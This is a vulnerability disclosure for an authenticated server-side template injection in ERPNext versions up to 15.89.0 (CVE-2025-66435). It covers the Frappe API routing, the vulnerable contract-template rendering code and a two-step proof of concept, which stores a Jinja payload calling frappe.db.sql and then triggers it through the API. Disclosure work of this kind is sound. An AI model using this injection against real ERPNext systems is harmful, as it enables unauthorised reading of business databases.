**SSTI on ERPNEXT ≤ 15.89.0 (CVE-2025-66435)**
**Exploit Author: An Chu ( aka iamanc )**

**Vendor:** Frappe Technologies Pvt. Ltd.

**Product:** ERPNext

**Affected Versions:** ERPNext ≤ 15.89.0

**CVE:  CVE‑2025‑66435**

**Impact:** 

An authenticated attacker can exploit this vulnerability to execute arbitrary SQL queries via server-side template injection, resulting in disclosure of sensitive database information.

**Summary**:

An **authenticated SSTI (Server-Side Template Injection)** vulnerability exists in the `get_contract_template` method of ERPNext. The function renders attacker-controlled Jinja2 templates (`contract_terms`) using `frappe.render_template()` with a user-supplied context (`doc`). Although Frappe uses a custom `SandboxedEnvironment`, several dangerous globals such as `frappe.db.sql` are still available in the execution context via `get_safe_globals()`.

An attacker with access to create or modify a `Contract Template` can inject arbitrary Jinja expressions into the `contract_terms` field, resulting in server-side code execution within a restricted but still unsafe context. This vulnerability can be used to leak database information.

**Technical Details:**

ERPNext is an open-source ERP system built on the Frappe Framework, which is written in Python and uses MariaDB/MySQL as its backend database.

**HTTP Routing in Frappe**

- Frappe exposes backend Python functions through HTTP endpoints.
- The endpoint format is :

```php
/api/method/<python.module.path>.<function_name>
```

•  When a request is sent to this URL, Frappe resolves the module path and **executes the corresponding Python function directly**.

**@frappe.whitelist()**

- The `@frappe.whitelist()` decorator **exposes a Python function as a public HTTP API**.
- Whitelisted functions:
    - Accept parameters directly from user-controlled HTTP requests
    - Do not enforce input validation by default
- This decorator defines the **attack entry point** for this vulnerability.

Example: 

Source code

```php
@frappe.whitelist()
def test(a, b):
    return a + b
```

Request

```php
POST /api/method/module.test
a=1&b=2
```

**Vulnerable Template Rendering:**

frappe uses frappe.render_template(template, context) to render Jinja2 templates. Even with SandboxedEnvironment, dangerous globals remain:

```php
from frappe import render_template, get_safe_globals

render_template(user_template, user_context)
```

`get_safe_globals()` exposes:

- frappe.db.sql
- frappe.get_doc
- frappe.throw
- frappe.local

If a malicious Jinja expression is injected, attacker can execute Python code in this restricted environment and query the database.

**Vulnerable Functions Analysis:**

**Vulnerable source code:**

File /erpnext/crm/doctype/contract_template/contract_template.py

```php
@frappe.whitelist()
def get_contract_template(template_name, doc):
	if isinstance(doc, str):
		doc = json.loads(doc)

	contract_template = frappe.get_doc("Contract Template", template_name)
	contract_terms = None

	if contract_template.contract_terms:
		contract_terms = frappe.render_template(contract_template.contract_terms, doc)

	return {"contract_template": contract_template, "contract_terms": contract_terms}
```

**Root Cause**

```python
"contract_terms": frappe.render_template(template.contract_terms, doc)
```

- `contract_terms` is loaded directly from the **Contract Template** doctype.
- This field is fully **user‑controlled** by authenticated users with permission to create or edit Contract Templates.
- The value is rendered using `frappe.render_template()` **without sanitization or sandbox hardening**.
- The Jinja2 execution context exposes unsafe globals via `get_safe_globals()`, including `frappe.db.sql`.

As a result, an authenticated attacker can inject arbitrary Jinja2 expressions, leading to **Server‑Side Template Injection (SSTI)**.

**PoC:**

### Step 1: Inject SSTI Payload via UI

Navigate to:

```
CRM →  Contract Template
```

Create or edit a Contract Template.

Set **Contract Terms** to:

```
{{ frappe.db.sql("SELECT @@version") }}
```

Save the document.
<img width="1526" height="400" alt="image" src="https://github.com/user-attachments/assets/da50208a-67f4-4e52-bfbb-a046e7f91e18" />

At this stage, the payload is stored but not yet executed.

<img width="1543" height="400" alt="image" src="https://github.com/user-attachments/assets/9c00e39d-a542-4ba2-a841-cb30ecbdf7d4" />


---

### Step 2: Direct API Invocation

The same vulnerability can be triggered by calling the whitelisted method directly:

```
POST /api/method/erpnext.contracts.doctype.contract.contract.get_contract_template
```

When the request is processed, the injected `contract_terms` payload is rendered and executed, and the evaluated output is returned in the response.
<img width="2048" height="400" alt="image" src="https://github.com/user-attachments/assets/a593fc9d-176e-4390-a07c-b292fa9221a6" />
